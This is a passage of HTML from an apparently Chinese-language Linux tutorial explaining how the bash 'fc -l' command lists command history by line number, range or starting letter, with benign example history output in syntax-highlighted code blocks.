class=\"crayon-h\"> </span><span class=\"crayon-v\">uname</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">-</span><span class=\"crayon-i\">a</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b4aa931c7f8a766378986-12\"><span class=\"crayon-h\"> </span><span class=\"crayon-i\">echo</span><span class=\"crayon-h\"> </span><span class=\"crayon-s\">\"Welcome to OSTechNix\"</span></div><div class=\"crayon-line\" id=\"crayon-5b4aa931c7f8a766378986-13\"><span class=\"crayon-h\"> </span><span class=\"crayon-e\">sudo </span><span class=\"crayon-v\">apcman</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">-</span><span class=\"crayon-e\">Syu</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b4aa931c7f8a766378986-14\"><span class=\"crayon-e\"> </span><span class=\"crayon-e\">cat </span><span class=\"crayon-v\">ostechnix</span><span class=\"crayon-sy\">.</span><span class=\"crayon-e\">txt</span></div><div class=\"crayon-line\" id=\"crayon-5b4aa931c7f8a766378986-15\"><span class=\"crayon-e\"> </span><span class=\"crayon-v\">wc</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">-</span><span class=\"crayon-i\">l</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">ostechnix</span><span class=\"crayon-sy\">.</span><span class=\"crayon-e\">txt</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b4aa931c7f8a766378986-16\"><span class=\"crayon-e\"> </span><span class=\"crayon-e\">more </span><span class=\"crayon-v\">ostechnix</span><span class=\"crayon-sy\">.</span><span class=\"crayon-e\">txt</span></div><div class=\"crayon-line\" id=\"crayon-5b4aa931c7f8a766378986-17\"><span class=\"crayon-e\"> </span><span class=\"crayon-i\">clear</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b4aa931c7f8a766378986-18\"> </div></div></td>\r\n\t\t\t\t\t</tr>\r\n\t\t\t\t</table>\r\n\t\t\t</div>\r\n\t\t</div>\r\n<!-- [Format Time: 0.0020 seconds] -->\r\n<p>这样行号就不再显示了。</p>\n<p>如果想以某个命令开始，只需在 <code>-l</code> 选项后面加上行号即可。比如，要显示行号 520 至最近的命令，可以这样：</p><!-- Crayon Syntax Highlighter v2.7.1.1 -->\r\n\r\n\t\t<div id=\"crayon-5b4aa931c7f90340058201\" class=\"crayon-syntax crayon-theme-github crayon-font-monaco crayon-os-pc print-yes notranslate\" data-settings=\" minimize scroll-always\" style=\" margin-top: 12px; margin-bottom: 12px; font-size: 13px !important; line-height: 15px !important;\">\r\n\t\t\r\n\t\t\t<div class=\"crayon-toolbar\" data-settings=\" show\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><span class=\"crayon-title\"></span>\r\n\t\t\t<div class=\"crayon-tools\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><div class=\"crayon-button crayon-nums-button\" title=\"切换是否显示行编号\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-plain-button\" title=\"纯文本显示代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-wrap-button\" title=\"切换自动换行\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-expand-button\" title=\"点击展开代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-copy-button\" title=\"复制代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-popup-button\" title=\"在新窗口中显示代码\"><div class=\"crayon-button-icon\"></div></div></div></div>\r\n\t\t\t<div class=\"crayon-info\" style=\"min-height: 18.2px !important; line-height: 18.2px !important;\"></div>\r\n\t\t\t<div class=\"crayon-plain-wrap\"><textarea wrap=\"soft\" class=\"crayon-plain print-no\" data-settings=\"dblclick\" readonly style=\"-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 13px !important; line-height: 15px !important;\">\n$ fc -l 520\r\n520 ls -l\r\n521 pwd\r\n522 uname -r\r\n523 uname -a\r\n524 echo \"Welcome to OSTechNix\"\r\n525 sudo apcman -Syu\r\n526 cat ostechnix.txt\r\n527 wc -l ostechnix.txt\r\n528 more ostechnix.txt\r\n529 clear\r\n530 fc -ln\r\n531 fc -l\r\n</textarea></div>\r\n\t\t\t<div class=\"crayon-main\" style=\"\">\r\n\t\t\t\t<table class=\"crayon-table\">\r\n\t\t\t\t\t<tr class=\"crayon-row\">\r\n\t\t\t\t<td class=\"crayon-nums \" data-settings=\"show\">\r\n\t\t\t\t\t<div class=\"crayon-nums-content\" style=\"font-size: 13px !important; line-height: 15px !important;\"><div class=\"crayon-num\" data-line=\"crayon-5b4aa931c7f90340058201-1\">1</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b4aa931c7f90340058201-2\">2</div><div class=\"crayon-num\" data-line=\"crayon-5b4aa931c7f90340058201-3\">3</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b4aa931c7f90340058201-4\">4</div><div class=\"crayon-num\" data-line=\"crayon-5b4aa931c7f90340058201-5\">5</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b4aa931c7f90340058201-6\">6</div><div class=\"crayon-num\" data-line=\"crayon-5b4aa931c7f90340058201-7\">7</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b4aa931c7f90340058201-8\">8</div><div class=\"crayon-num\" data-line=\"crayon-5b4aa931c7f90340058201-9\">9</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b4aa931c7f90340058201-10\">10</div><div class=\"crayon-num\" data-line=\"crayon-5b4aa931c7f90340058201-11\">11</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b4aa931c7f90340058201-12\">12</div><div class=\"crayon-num\" data-line=\"crayon-5b4aa931c7f90340058201-13\">13</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b4aa931c7f90340058201-14\">14</div></div>\r\n\t\t\t\t</td>\r\n\t\t\t\t\t\t<td class=\"crayon-code\"><div class=\"crayon-pre\" style=\"font-size: 13px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;\"><div class=\"crayon-line\" id=\"crayon-5b4aa931c7f90340058201-1\"><span class=\"crayon-sy\">$</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">fc</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">-</span><span class=\"crayon-i\">l</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">520</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b4aa931c7f90340058201-2\"><span class=\"crayon-cn\">520</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">ls</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">-</span><span class=\"crayon-i\">l</span></div><div class=\"crayon-line\" id=\"crayon-5b4aa931c7f90340058201-3\"><span class=\"crayon-cn\">521</span><span class=\"crayon-h\"> </span><span class=\"crayon-i\">pwd</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b4aa931c7f90340058201-4\"><span class=\"crayon-cn\">522</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">uname</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">-</span><span class=\"crayon-i\">r</span></div><div class=\"crayon-line\" id=\"crayon-5b4aa931c7f90340058201-5\"><span class=\"crayon-cn\">523</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">uname</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">-</span><span class=\"crayon-i\">a</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b4aa931c7f90340058201-6\"><span class=\"crayon-cn\">524</span><span class=\"crayon-h\"> </span><span class=\"crayon-i\">echo</span><span class=\"crayon-h\"> </span><span class=\"crayon-s\">\"Welcome to OSTechNix\"</span></div><div class=\"crayon-line\" id=\"crayon-5b4aa931c7f90340058201-7\"><span class=\"crayon-cn\">525</span><span class=\"crayon-h\"> </span><span class=\"crayon-e\">sudo </span><span class=\"crayon-v\">apcman</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">-</span><span class=\"crayon-i\">Syu</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b4aa931c7f90340058201-8\"><span class=\"crayon-cn\">526</span><span class=\"crayon-h\"> </span><span class=\"crayon-e\">cat </span><span class=\"crayon-v\">ostechnix</span><span class=\"crayon-sy\">.</span><span class=\"crayon-i\">txt</span></div><div class=\"crayon-line\" id=\"crayon-5b4aa931c7f90340058201-9\"><span class=\"crayon-cn\">527</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">wc</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">-</span><span class=\"crayon-i\">l</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">ostechnix</span><span class=\"crayon-sy\">.</span><span class=\"crayon-i\">txt</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b4aa931c7f90340058201-10\"><span class=\"crayon-cn\">528</span><span class=\"crayon-h\"> </span><span class=\"crayon-e\">more </span><span class=\"crayon-v\">ostechnix</span><span class=\"crayon-sy\">.</span><span class=\"crayon-i\">txt</span></div><div class=\"crayon-line\" id=\"crayon-5b4aa931c7f90340058201-11\"><span class=\"crayon-cn\">529</span><span class=\"crayon-h\"> </span><span class=\"crayon-i\">clear</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b4aa931c7f90340058201-12\"><span class=\"crayon-cn\">530</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">fc</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">-</span><span class=\"crayon-i\">ln</span></div><div class=\"crayon-line\" id=\"crayon-5b4aa931c7f90340058201-13\"><span class=\"crayon-cn\">531</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">fc</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">-</span><span class=\"crayon-i\">l</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b4aa931c7f90340058201-14\"> </div></div></td>\r\n\t\t\t\t\t</tr>\r\n\t\t\t\t</table>\r\n\t\t\t</div>\r\n\t\t</div>\r\n<!-- [Format Time: 0.0021 seconds] -->\r\n<p>要列出一段范围内的命令，将始、末行号作为 <code>fc -l</code> 的参数即可，比如 520 至 525：</p><!-- Crayon Syntax Highlighter v2.7.1.1 -->\r\n\r\n\t\t<div id=\"crayon-5b4aa931c7f93808796740\" class=\"crayon-syntax crayon-theme-github crayon-font-monaco crayon-os-pc print-yes notranslate\" data-settings=\" minimize scroll-always\" style=\" margin-top: 12px; margin-bottom: 12px; font-size: 13px !important; line-height: 15px !important;\">\r\n\t\t\r\n\t\t\t<div class=\"crayon-toolbar\" data-settings=\" show\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><span class=\"crayon-title\"></span>\r\n\t\t\t<div class=\"crayon-tools\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><div class=\"crayon-button crayon-nums-button\" title=\"切换是否显示行编号\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-plain-button\" title=\"纯文本显示代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-wrap-button\" title=\"切换自动换行\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-expand-button\" title=\"点击展开代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-copy-button\" title=\"复制代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-popup-button\" title=\"在新窗口中显示代码\"><div class=\"crayon-button-icon\"></div></div></div></div>\r\n\t\t\t<div class=\"crayon-info\" style=\"min-height: 18.2px !important; line-height: 18.2px !important;\"></div>\r\n\t\t\t<div class=\"crayon-plain-wrap\"><textarea wrap=\"soft\" class=\"crayon-plain print-no\" data-settings=\"dblclick\" readonly style=\"-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 13px !important; line-height: 15px !important;\">\n$ fc -l 520 525\r\n520 ls -l\r\n521 pwd\r\n522 uname -r\r\n523 uname -a\r\n524 echo \"Welcome to OSTechNix\"\r\n525 sudo apcman -Syu\r\n</textarea></div>\r\n\t\t\t<div class=\"crayon-main\" style=\"\">\r\n\t\t\t\t<table class=\"crayon-table\">\r\n\t\t\t\t\t<tr class=\"crayon-row\">\r\n\t\t\t\t<td class=\"crayon-nums \" data-settings=\"show\">\r\n\t\t\t\t\t<div class=\"crayon-nums-content\" style=\"font-size: 13px !important; line-height: 15px !important;\"><div class=\"crayon-num\" data-line=\"crayon-5b4aa931c7f93808796740-1\">1</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b4aa931c7f93808796740-2\">2</div><div class=\"crayon-num\" data-line=\"crayon-5b4aa931c7f93808796740-3\">3</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b4aa931c7f93808796740-4\">4</div><div class=\"crayon-num\" data-line=\"crayon-5b4aa931c7f93808796740-5\">5</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b4aa931c7f93808796740-6\">6</div><div class=\"crayon-num\" data-line=\"crayon-5b4aa931c7f93808796740-7\">7</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b4aa931c7f93808796740-8\">8</div></div>\r\n\t\t\t\t</td>\r\n\t\t\t\t\t\t<td class=\"crayon-code\"><div class=\"crayon-pre\" style=\"font-size: 13px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;\"><div class=\"crayon-line\" id=\"crayon-5b4aa931c7f93808796740-1\"><span class=\"crayon-sy\">$</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">fc</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">-</span><span class=\"crayon-i\">l</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">520</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">525</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b4aa931c7f93808796740-2\"><span class=\"crayon-cn\">520</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">ls</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">-</span><span class=\"crayon-i\">l</span></div><div class=\"crayon-line\" id=\"crayon-5b4aa931c7f93808796740-3\"><span class=\"crayon-cn\">521</span><span class=\"crayon-h\"> </span><span class=\"crayon-i\">pwd</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b4aa931c7f93808796740-4\"><span class=\"crayon-cn\">522</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">uname</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">-</span><span class=\"crayon-i\">r</span></div><div class=\"crayon-line\" id=\"crayon-5b4aa931c7f93808796740-5\"><span class=\"crayon-cn\">523</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">uname</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">-</span><span class=\"crayon-i\">a</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b4aa931c7f93808796740-6\"><span class=\"crayon-cn\">524</span><span class=\"crayon-h\"> </span><span class=\"crayon-i\">echo</span><span class=\"crayon-h\"> </span><span class=\"crayon-s\">\"Welcome to OSTechNix\"</span></div><div class=\"crayon-line\" id=\"crayon-5b4aa931c7f93808796740-7\"><span class=\"crayon-cn\">525</span><span class=\"crayon-h\"> </span><span class=\"crayon-e\">sudo </span><span class=\"crayon-v\">apcman</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">-</span><span class=\"crayon-i\">Syu</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b4aa931c7f93808796740-8\"> </div></div></td>\r\n\t\t\t\t\t</tr>\r\n\t\t\t\t</table>\r\n\t\t\t</div>\r\n\t\t</div>\r\n<!-- [Format Time: 0.0012 seconds] -->\r\n<p>除了使用行号，我们还可以使用字符。比如，要列出最近一个 <code>pwd</code> 至最近一个命令之间的所有命令，只需要像下面这样使用起始字母即可：</p><!-- Crayon Syntax Highlighter v2.7.1.1 -->\r\n\r\n\t\t<div id=\"crayon-5b4aa931c7f97696496530\" class=\"crayon-syntax crayon-theme-github crayon-font-monaco crayon-os-pc print-yes notranslate\" data-settings=\" minimize scroll-always\" style=\" margin-top: 12px; margin-bottom: 12px; font-size: 13px !important; line-height: 15px !important;\">\r\n\t\t\r\n\t\t\t<div class=\"crayon-toolbar\" data-settings=\" show\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><span class=\"crayon-title\"></span>\r\n\t\t\t<div class=\"crayon-tools\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><div class=\"crayon-button crayon-nums-button\" title=\"切换是否显示行编号\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-plain-button\" title=\"纯文本显示代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-wrap-button\" title=\"切换自动换行\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-expand-button\" title=\"点击展开代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-copy-button\" title=\"复制代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-popup-button\" title=\"在新窗口中显示代码\"><div class=\"crayon-button-icon\"></div></div></div></div>\r\n\t\t\t<div class=\"crayon-info\" style=\"min-height: 18.2px !important; line-height: 18.2px !important;\"></div>\r\n\t\t\t<div class=\"crayon-plain-wrap\"><textarea wrap=\"soft\" class=\"crayon-plain print-no\" data-settings=\"dblclick\" readonly style=\"-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 13px !important; line-height: 15px !important;\">\n$ fc -l p\r\n521 pwd\r\n522 uname -r\r\n523 uname -a\r\n524 echo \"Welcome to OSTechNix\"\r\n525 sudo apcman -Syu\r\n526 cat ostechnix.txt\r\n527 wc -l ostechnix.txt\r\n528 more ostechnix.txt\r\n529 clear\r\n530 fc -ln\r\n531 fc -l\r\n532 fc -l 520\r\n533 fc -l 520 525\r\n534 fc -l 520\r\n535 fc -l 522\r\n536 fc -l l\r\n</textarea></div>\r\n\t\t\t<div class=\"crayon-main\" style=\"\">\r\n\t\t\t\t<table class=\"crayon-table\">\r\n\t\t\t\t\t<tr class=\"crayon-row\">\r\n\t\t\t\t<td class=\"crayon-nums \" data-settings=\"show\">\r\n\t\t\t\t\t<div class=\"crayon-nums-content\" style=\"font-size: 13px !important; line-height: 15px !important;\"><div class=\"crayon-num\" data-line=\"crayon-5b4aa931c7f97696496530-1\">1</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b4aa931c7f97696496530-2\">2</div><div class=\"crayon-num\" data-line=\"crayon-5b4aa931c7f97696496530-3\">3</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b4aa931c7f97696496530-4\">4</div><div class=\"crayon-num\" data-line=\"crayon-5b4aa931c7f97696496530-5\">5</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b4aa931c7f97696496530-6\">6</div><div class=\"crayon-num\" data-line=\"crayon-5b4aa931c7f97696496530-7\">7</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b4aa931c7f97696496530-8\">8</div><div class=\"crayon-num\" data-line=\"crayon-5b4aa931c7f97696496530-9\">9</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b4aa931c7f97696496530-10\">10</div><div class=\"crayon-num\" data-line=\"crayon-5b4aa931c7f97696496530-11\">11</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b4aa931c7f97696496530-12\">12</div><div class=\"crayon-num\" data-line=\"crayon-5b4aa931c7f97696496530-13\">13</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b4aa931c7f97696496530-14\">14</div><div class=\"crayon-num\" data-line=\"crayon-5b4aa931c7f97696496530-15\">15</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b4aa931c7f97696496530-16\">16</div><div class=\"crayon-num\" data-line=\"crayon-5b4aa931c7f97696496530-17\">17</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b4aa931c7f97696496530-18\">18</div></div>\r\n\t\t\t\t</td>\r\n\t\t\t\t\t\t<td class=\"crayon-code\"><div class=\"crayon-pre\" style=\"font-size: 13px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;\"><div class=\"crayon-line\" id=\"crayon-5b4aa931c7f97696496530-1\"><span class=\"crayon-sy\">$</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">fc</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">-</span><span class=\"crayon-i\">l</span><span class=\"crayon-h\"> </span><span class=\"crayon-i\">p</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b4aa931c7f97696496530-2\"><span class=\"crayon-cn\">521</span><span class=\"crayon-h\"> </span><span class=\"crayon-i\">pwd</span></div><div class=\"crayon-line\" id=\"crayon-5b4aa931c7f97696496530-3\"><span class=\"crayon-cn\">522</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">uname</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">-</span><span class=\"crayon-i\">r</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b4aa931c7f97696496530-4\"><span class=\"crayon-cn\">523</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">uname</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">-</span><span class=\"crayon-i\">a</span></div><div class=\"crayon-line\" id=\"crayon-5b4aa931c7f97696496530-5\"><span class=\"crayon-cn\">524</span><span class=\"crayon-h\"> </span><span class=\"crayon-i\">echo</span><span class=\"crayon-h\"> </span><span class=\"crayon-s\">\"Welcome to OSTechNix\"</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b4aa931c7f97696496530-6\"><span class=\"crayon-cn\">525</span><span class=\"crayon-h\"> </span><span class=\"crayon-e\">sudo </span><span class=\"crayon-v\">apcman</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">-</span><span class=\"crayon-i\">Syu</span></div><div class=\"crayon-line\" id=\"crayon-5b4aa931c7f97696496530-7\"><span class=\"crayon-cn\">526</span><span class=\"crayon-h\"> </span><span class=\"crayon-e\">cat </span><span class=\"crayon-v\">ostechnix</span><span class=\"crayon-sy\">.</span><span class=\"crayon-i\">txt</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b4aa931c7f97696496530-8\"><span class=\"crayon-cn\">527</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">wc</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">-</span><span class=\"crayon-i\">l</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">ostechnix</span><span class=\"crayon-sy\">.</span><span class=\"crayon-i\">txt</span></div><div class=\"crayon-line\" id=\"crayon-5b4aa931c7f97696496530-9\"><span class=\"crayon-cn\">528</span><span class=\"crayon-h\"> </span><span class=\"crayon-e\">more </span><span class=\"crayon-v\">ostechnix</span><span class=\"crayon-sy\">.</span><span class=\"crayon-i\">txt</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b4aa931c7f97696496530-10\"><span class=\"crayon-cn\">529</span><span class=\"crayon-h\"> </span><span class=\"crayon-i\">clear</span></div><div class=\"crayon-line\" id=\"crayon-5b4aa931c7f97696496530-11\"><span class=\"crayon-cn\">530</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">fc</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">-</span><span class=\"crayon-i\">ln</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b4aa931c7f97696496530-12\"><span class=\"crayon-cn\">531</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">fc</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">-</span><span class=\"crayon-i\">l</span></div><div class=\"crayon-line\" id=\"crayon-5b4aa931c7f97696496530-13\"><span class=\"crayon-cn\">532</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">fc</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">-</span><span class=\"crayon-i\">l</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">520</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b4aa931c7f97696496530-14\"><span class=\"crayon-cn\">533</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">fc</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">-</span><span class=\"crayon-i\">l</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">520</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">525</span></div><div class=\"crayon-line\" id=\"crayon-5b4aa931c7f97696496530-15\"><span class=\"crayon-cn\">534</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">fc</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">-</span><span class=\"crayon-i\">l</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">520</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b4aa931c7f97696496530-16\"><span class=\"crayon-cn\">535</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">fc</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">-</span><span class=\"crayon-i\">l</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">522</span></div><div class=\"crayon-line\" id=\"crayon-5b4aa931c7f97696496530-17\"><span class=\"crayon-cn\">536</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">fc</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">-</span><span class=\"crayon-i\">l</span><span class=\"crayon-h\"> </span><span class=\"crayon-i\">l</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b4aa931c7f97696496530-18\"> </div></div></td>\r\n\t\t\t\t\t</tr>\r\n\t\t\t\t</table>\r\n\t\t\t</div>\r\n\t\t</div>\r\n<!-- [Format Time: 0.0026 seconds] -->\r\n<p>要列出所有 <code>pwd</code> 和 <code>more</code> 之间的命令，你可以都使用起始字母，像这样：</p><!-- Crayon Syntax Highlighter v2.7.1.1 -->\r\n\r\n\t\t<div id=\"crayon-5b4aa931c7f9a344432881\" class=\"crayon-syntax crayon-theme-github crayon-font-monaco crayon-os-pc print-yes notranslate\" data-settings=\" minimize scroll-always\" style=\" margin-top: 12px; margin-bottom: 12px; font-size: 13px !important; line-height: 15px !important;\">\r\n\t\t\r\n\t\t\t<div class=\"crayon-toolbar\" data-settings=\" show\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><span class=\"crayon-title\"></span>\r\n\t\t\t<div class=\"crayon-tools\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><div class=\"crayon-button crayon-nums-button\" title=\"切换是否显示行编号\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-plain-button\" title=\"纯文本显示代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-wrap-button\" title=\"切换自动换行\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-expand-button\" title=\"点击展开代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-copy-button\" title=\"复制代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-popup-button\" title=\"在新窗口中显示代码\"><div class=\"crayon-button-icon\"></div></div></div></div>\r\n\t\t\t<div class=\"crayon-info\" style=\"min-height: 18.2px !important; line-height: 18.2px !important;\"></div>\r\n\t\t\t<div class=\"crayon-plain-wrap\"><textarea wrap=\"soft\" class=\"crayon-plain print-no\" data-settings=\"dblclick\" readonly style=\"-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 13px !important; line-height: 15px !important;\">\n$ fc -l p m\r\n</textarea></div>\r\n\t\t\t<div class=\"crayon-main\" style=\"\">\r\n\t\t\t\t<table class=\"crayon-table\">\r\n\t\t\t\t\t<tr class=\"crayon-row\">\r\n\t\t\t\t<td class=\"crayon-nums \" data-settings=\"show\">\r\n\t\t\t\t\t<div class=\"crayon-nums-content\" style=\"font-size: 13px !important; line-height: 15px !important;\"><div class=\"crayon-num\" data-line=\"crayon-5b4aa931c7f9a344432881-1\">1</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b4aa931c7f9a344432881-2\">2</div></div>\r\n\t\t\t\t</td>\r\n\t\t\t\t\t\t<td class=\"crayon-code\"><div class=\"crayon-pre\" style=\"font-size: 13px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;\"><div class=\"crayon-line\" id=\"crayon-5b4aa931c7f9a344432881-1\"><span class=\"crayon-sy\">$</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">fc</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">-</span><span class=\"crayon-i\">l</span><span class=\"crayon-h\"> </span><span class=\"crayon-i\">p</span><span class=\"crayon-h\"> </span><span class=\"crayon-i\">m</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b4aa931c7f9a344432881-2\"> </div></div></td>\r\n\t\t\t\t\t</tr>\r\n\t\t\t\t</table>\r\n\t\t\t</div>\r\n\t\t</div>\r\n<!-- [Format Time: 0.0004 seconds] -->\r\n<p>或者，使用开始命令的首字母以及结束命令的行号：</p><!-- Crayon Syntax Highlighter v2.7.1.1 -->\r\n\r\n\t\t<div id=\"crayon-5b4aa931c7f9d153132523\" class=\"crayon-syntax crayon-theme-github crayon-font-monaco crayon-os-pc print-yes notranslate\" data-settings=\" minimize scroll-always\" style=\" margin-top: 12px; margin-bottom: 12px; font-size: 13px !important; line-height: 15px !important;\">\r\n\t\t\r\n\t\t\t<div class=\"crayon-toolbar\" 